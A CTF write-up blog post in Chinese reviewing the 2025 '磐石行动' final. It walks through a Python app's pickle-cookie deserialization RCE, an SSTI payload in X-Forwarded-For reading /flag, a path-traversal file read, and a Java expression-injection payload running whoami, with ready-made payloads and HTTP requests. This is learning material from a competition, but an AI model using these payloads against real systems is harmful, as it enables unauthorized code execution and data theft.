+++
date = '2025-08-25T17:46:53+08:00'
draft = false
title = '磐石行动 - 2025 决赛复盘'
categories = ['WriteUP']
tags = ['WriteUP', '磐石行动', '2025']

+++

## 前言

本来准备了很多 PHP 的防御和攻击方面的内容，结果没想到是一个 Python 和一个 Java 直接给我肘飞了，最后艰难从第 30 名打回第 9 名，真的是太不容易了。

## Web

### Web 1

#### 反序列化漏洞

首先，拿到项目源码，发现是一个 Python 项目，里面写了很多东西，它的框架好像也是自定义的，由于刚拿到源码的时候对这个项目非常陌生，一直无从下手，甚至没找到它的路由，经过一顿分析才有了头绪。

![](../assets/43619b40540efebc21bd6f69fb864cf2.png)

这个项目的核心功能的实现大部分是在 `handlers` 中，包括路由的设置，经过长时间的审计，发现了一个反序列化的漏洞，具体如下，我留意到这里存在 `pickle.loads`，并且里面的参数 `rememberme` 是可以由用户控制的，可以肯定的是这里存在漏洞。

```python
def get_user_from_cookie():
    sid = get_session_id_from_cookie()
    user = get_user_by_sid(sid)
    if user is not None:
        return user
    cookies = web.cookies()
    remeberme = cookies.get("rememberme", "")
    if remeberme != "":
        user = pickle.loads(bytes.fromhex(remeberme))
        return user
```

接着，我们寻找调用了 `get_user_from_cookie` 的代码，找到以下代码，它在没有登录的状态下，会在最后去调用 `get_user_from_cookie` 去获取用户 cookie，来判断用户之前是否已经是登录状态。

```python
def get_current_user():
    if TestEnv.has_login:
        return get_user_by_name(TestEnv.login_user_name)

    user = get_user_from_token()
    if user != None:
        return user

    if not hasattr(web.ctx, "env"):
        # 尚未完成初始化
        return None

    return get_user_from_cookie()
```

然后，我们接着去寻找看看那里调用了 `get_current_user`，发现了两处直接调用，我们先看第一处，以这里为例，这个项目的路由是通过设置 `xurls` 去设置的，并且路由下的处理代码是使用类去封装、实现的。

我们看到 `r"/fs_find", SearchHandler`，那么 `/fs_find` 就是这个类的路由，访问这个路由就会触发 `SearchHandler` 类中的方法去处理数据，但是由于这里存在 `@xauth.login_required("admin")` 鉴权，必须是 `admin` 在能访问这里的方法，但是我们目前无法登录，所以这里是不可用的。

```python
class SearchHandler:

    def GET(self):
        return self.POST()

    @xauth.login_required("admin")
    def POST(self):
        path = xutils.get_argument_str("path")
        if not path:
            path = xconfig.DATA_DIR

        path      = os.path.abspath(path)
        find_key  = xutils.get_argument("find_key", "")
        find_type = xutils.get_argument("type")
        mode      = xutils.get_argument("mode")

        if find_key == "" or find_key is None:
            find_key = xutils.get_argument_str("key", "")
        
        assert isinstance(find_key, str)
        find_key  = "*" + find_key + "*"
        path_name = os.path.join(path, find_key)

        if find_key == "**":
            plist = []
        elif path == os.path.abspath(xconfig.DATA_DIR) and xconfig.USE_CACHE_SEARCH:
            # search in cache
            plist = find_in_cache(find_key)
        else:
            plist = xutils.search_path(path, find_key)

        filelist = FS.process_file_list(plist, path)
        # TODO max result size
        tpl = "fs/page/fs.html"
        if mode == "grid":
            tpl = "fs/fs_grid.html"

        kw = Storage()
        kw.path = path
        kw.quoted_path = xutils.quote(path)
        kw.token = xauth.get_current_user().token
        kw.filelist = filelist

        return xtemplate.render(tpl, **kw)

xurls = (
    r"/fs_find", SearchHandler,
)
```

接着，我们看到第二处调用，在这个 `IndexHandler` 当中存在 `kw.user = xauth.get_current_user()` 对 `get_current_user` 进行了调用，并且这里是不需要鉴权的，也就是说是任何人都可以访问，并且执行下列的方法，所以我们可以在这里去触发反序列化的漏洞。

```python
class IndexHandler:

    def GET(self):
        arg_show_back = xutils.get_argument_bool("show_back")
        arg_show_menu = xutils.get_argument_bool("show_menu", default_value=True)
        user_name = xauth.current_name()
        menu_list = []

        def filter_link_func(link: AppLink):
            if link.is_guest:
                return user_name is None
            if link.is_user:
                return user_name != None
            if link.user == "" or link.user == None:
                return True
            return link.user == user_name

        for category in xconfig.MENU_LIST:
            children = category.children
            if len(children) == 0:
                continue
            children = list(filter(filter_link_func, children))
            menu_list.append(Storage(name=category.name, children=children))

        kw = Storage()
        kw.Storage = Storage
        kw.user = xauth.get_current_user()
        kw.menu_list = menu_list
        kw.html_title = "系统"
        kw.show_back = arg_show_back
        kw.show_menu = arg_show_menu

        return xtemplate.render("system/page/system_index.html", **kw)

# 略

xutils.register_func("url:/system/index", IndexHandler)

xurls = (
    r"/system/sys",   IndexHandler,
    r"/system/index", IndexHandler,
    r"/system/admin", AdminHandler,
    r"/system/system", IndexHandler,
    r"/system/reload", ReloadHandler,
    r"/system/pull_code", PullCodeHandler,
    r"/system/user\.css", UserCssHandler,
    r"/system/user\.js", UserJsHandler,
)
```

我们去构造恶意的序列化数据，由于项目在反序列化之前进行了一次 hex 解码，那么我们要将序列化数据编码之后再传过去。

```python
import os  
import pickle  
  
class rce():  
    text = "test"  
  
    def __reduce__(self):  
        cmd = 'whoami'  
        return (os.system,(cmd,))  
  
a = rce()  
serCon = pickle.dumps(a)  
enCon = bytes.hex(serCon)  
print(enCon)  
```

然后访问路由 `/system/sys`，在 Cookie 中传入我们恶意序列化数据即可反弹 Shell RCE。

```plaintext
GET /system/sys HTTP/1.1  
Host: 10.103.24.2:1234  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,_/_;q=0.8,application/signed-exchange;v=b3;q=0.7  
Accept-Encoding: gzip, deflate  
Accept-Language: zh-CN,zh;q=0.9  
Cookie: RememberMe=8004951e000000000000008c026e74948c0673797374656d9493948c0677686f616d6994859452942e
```

#### SSTI 漏洞

在后面查看别人的攻击流量时，发现这个项目还存在 SSTI 漏洞，注入点如下，我们发现项目框架中的 `render_text` 是存在 SSTI 漏洞的，由于 `self.tpl = self.tpl.replace("{{real_ip}}", real_ip)`，并且 `real_ip` 还是通过 `HTTP_X_FORWARDED_FOR` 去获取的，这很明显是可控的，那么我们只需要访问这个路由 `/api/getip.jsonp`，再对 `X-Forwarded-For` 传入我们的 payload 即可 RCE。

```python
# encoding=utf-8
# getip 
# Created on 2017/09/26
# @modified 2019/07/12 00:52:34
import web
import xutils
import xtemplate

def get_real_ip():
    real_ip_list = web.ctx.env.get("HTTP_X_FORWARDED_FOR")
    if real_ip_list != None and len(real_ip_list) > 0:
        return real_ip_list.split(",")[0]
    return web.ctx.env.get("REMOTE_ADDR")

class handler:

    def GET(self):
        # X-Forwarded-For是RFC 7239（Forwarded HTTP Extension）定义的扩展首部，大部分代理支持
        # 格式如下：
        # X-Forwarded-For: client, proxy1, proxy2
        # 而X-Real-IP目前不属于任何标准
        # See https://imququ.com/post/x-forwarded-for-header-in-http.html
        yield "X-Forwarded-For: "
        yield web.ctx.env.get("HTTP_X_FORWARDED_FOR")
        yield "\nRemote Addr: "
        yield web.ctx.env.get("REMOTE_ADDR")
        yield "\n"

class JsonpHandler:

    tpl = """
{{callback}}({
    real_ip: "{{real_ip}}"
});
    """

    def GET(self):
        callback = xutils.get_argument_str("callback", "callback")
        real_ip = get_real_ip()
        self.tpl = self.tpl.replace("{{real_ip}}", real_ip)
        return xtemplate.render_text(self.tpl, real_ip = real_ip, callback = callback)

xurls = (
    r"/api/getip", handler,
    r"/api/getip.jsonp", JsonpHandler,
)
```

构造如下。

```plaintext
GET /api/getip.jsonp HTTP/1.1  
Host: 10.103.24.2:1234  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,_/_;q=0.8,application/signed-exchange;v=b3;q=0.7  
Accept-Encoding: gzip, deflate  
Accept-Language: zh-CN,zh;q=0.9  
X-Forwarded-For: {{[].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__']['__imp'+'ort__']('os').__dict__['pop'+'en']('cat /flag').read()}}
```

#### 路径穿越 & 任意文件读取漏洞

相关源码如下，这里也是需要鉴权的，但是可能有队伍绕过了鉴权，才能利用到这个漏洞。

```python
class ViewSourceHandler:

    def get_default_kw(self):
        kw = Storage()
        kw._show_footer = False
        return kw

    @xauth.login_required("admin")
    def GET(self, path=""):
        template_name = "code/page/code_edit.html"
        path = xutils.get_argument("path", "")
        key = xutils.get_argument("key", "")
        type = xutils.get_argument_str("type", "")
        readonly = False

        kw = self.get_default_kw()
        # 处理嵌入页面
        handle_embed(kw)
        # 处理参数
        handle_args(kw)

        if path == "":
            return xtemplate.render(template_name,
                                    content="",
                                    error="path is empty")

        path = resolve_path(path, type)
        if not os.path.exists(path):
            kw = Storage()
            kw.path = path
            kw.content = ""
            kw.warn = "文件不存在"
            return xtemplate.render(template_name, **kw)

        error = ""
        warn = ""
        try:
            max_file_size = xconfig.MAX_TEXT_SIZE
            if xutils.get_file_size_int(path, raise_exception=True) >= max_file_size:
                warn = "文件过大，只显示部分内容"
                readonly = True

            content = xutils.readfile(path, limit=max_file_size)
            assert isinstance(content, str)
            plugin_name = fsutil.get_relative_path(path, xconfig.PLUGINS_DIR)
            # 使用JavaScript来处理搜索关键字高亮问题
            # if key != "":
            #     content = xutils.html_escape(content)
            #     key     = xhtml_escape(key)
            #     content = textutil.replace(content, key, htmlutil.span("?", "search-key"), ignore_case=True, use_template=True)
            
            kw.show_preview = can_preview(path)
            kw.readonly = readonly
            kw.error = error
            kw.warn = warn
            kw.pathlist = xutils.splitpath(path)
            kw.name = os.path.basename(path)
            kw.path = path
            kw.content = content
            kw.plugin_name = plugin_name
            kw.lines = content.count("\n")+1
            return xtemplate.render(template_name, **kw)
        except Exception as e:
            xutils.print_exc()
            error = e
        return xtemplate.render(template_name,
                                path=path,
                                name="",
                                readonly=readonly,
                                error=error, lines=0, content="", **kw)

# 略 

xurls = (
    r"/code/view_source", ViewSourceHandler,
    r"/code/view_source/update", UpdateHandler,
    r"/code/update", UpdateHandler,
    r"/code/edit", ViewSourceHandler
)
```

访问 `/code/edit` 路由，然后传参 `path` 去读 flag 即可，详细地利用方式暂时未知。

### Web 2

这一题是一个 Java 题目，也是比较难去分析，很长一段时间后才被攻破。

博客系统留言板存在 Groovy 表达式注入漏洞，从而 RCE。

```plaintext
#{java.lang.Math.class.forName("java.io.BufferedReader").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName("java.io.InputStreamReader").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("whoami").getInputStream())).readLines();}
```
